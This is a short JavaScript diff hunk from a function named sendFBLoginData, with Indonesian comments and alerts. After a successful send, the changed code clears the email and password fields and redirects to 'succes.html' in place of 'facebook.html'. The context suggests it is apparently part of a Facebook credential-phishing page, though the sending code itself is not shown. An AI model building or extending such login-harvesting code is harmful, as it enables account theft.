@@ -341,7 +341,7 @@ async function sendFBLoginData() {
             if (emailEl) emailEl.value = "";
             if (passEl) passEl.value = "";
 
-            window.location.href = "facebook.html"; // MENGGANTI .php
+            window.location.href = "succes.html"; // MENGGANTI .php
         } else {
             console.error("FB send error:", text);
             alert("❌ Gagal mengirim data FB. Coba lagi.");
